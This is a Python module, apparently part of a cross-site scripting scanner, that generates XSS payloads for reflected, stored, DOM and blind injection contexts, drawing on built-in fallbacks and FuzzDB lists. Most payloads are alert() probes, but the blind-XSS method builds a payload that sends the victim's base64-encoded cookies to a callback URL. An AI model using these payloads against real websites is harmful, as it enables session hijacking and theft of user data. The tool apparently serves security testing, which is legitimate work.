# phase3_payload.py
import os
import re
import uuid

class PayloadGenerator:
    FALLBACK = {
        "html": ["<script>alert('{m}')</script>",
                 "<img src=x onerror=alert('{m}')>",
                 "<svg/onload=alert('{m}')>"],
        "attribute_double": ['"><script>alert("{m}")</script>',
                             '" autofocus onfocus="alert(\'{m}\')" x="'],
        "attribute_single": ["'><script>alert('{m}')</script>",
                             "' autofocus onfocus='alert(\"{m}\")' x='"],
        "script": ["';alert('{m}')//", '";alert("{m}")//',
                   "</script><script>alert('{m}')</script>"],
    }

    def __init__(self, fuzzdb_path: str | None = None):
        self.fuzzdb_path = fuzzdb_path
        self._cache: dict[str, list[str]] = {}

    def for_reflected(self, context: str, marker: str) -> list[str]:
        raw = self._load_context_payloads(context)
        if not raw:
            raw = self.FALLBACK.get(context, self.FALLBACK["html"])
        return [self._inject_marker(p, marker) for p in raw][:30]

    @staticmethod
    def for_stored(marker: str) -> list[str]:
        return [f"<script>alert('{marker}')</script>",
                f"<img src=x onerror=alert('{marker}')>",
                f"<svg/onload=alert('{marker}')>"]

    @staticmethod
    def for_blind(callback_url: str, marker: str) -> list[str]:
        cb = f"{callback_url.rstrip('/')}/{marker}"
        return [f'<script src="{cb}"></script>',
                f'<img src=x onerror="fetch(\'{cb}?c=\'+btoa(document.cookie))">']

    @staticmethod
    def for_dom(marker: str) -> list[str]:
        return [f"<img src=x onerror=alert('{marker}')>",
                f"<svg/onload=alert('{marker}')>"]

    @staticmethod
    def new_marker(prefix: str = "XSS") -> str:
        return f"{prefix}_{uuid.uuid4().hex[:10]}"

    def _load_context_payloads(self, context: str) -> list[str]:
        if not self.fuzzdb_path or context in self._cache:
            return self._cache.get(context, [])
        xss_dir = os.path.join(self.fuzzdb_path, "attack", "xss")
        if not os.path.isdir(xss_dir):
            return []
        lines: list[str] = []
        for fname in ("xss-uri.txt", "xss-payload-list.txt"):
            fpath = os.path.join(xss_dir, fname)
            if os.path.exists(fpath):
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    lines.extend(l.strip() for l in f if l.strip())
        if context == "attribute_double":
            lines = [p for p in lines if '">' in p or '"' in p]
        elif context == "attribute_single":
            lines = [p for p in lines if "'>" in p or "'" in p]
        elif context == "script":
            lines = [p for p in lines if "';" in p or '";' in p or "</script>" in p]
        lines = list(dict.fromkeys(lines))
        self._cache[context] = lines
        return lines

    @staticmethod
    def _inject_marker(payload: str, marker: str) -> str:
        for pat in (r"alert\('.*?'\)", r'alert\(".*?"\)', r"alert\(1\)"):
            if re.search(pat, payload):
                return re.sub(pat, f"alert('{marker}')", payload, count=1)
        return payload + f"<!--{marker}-->"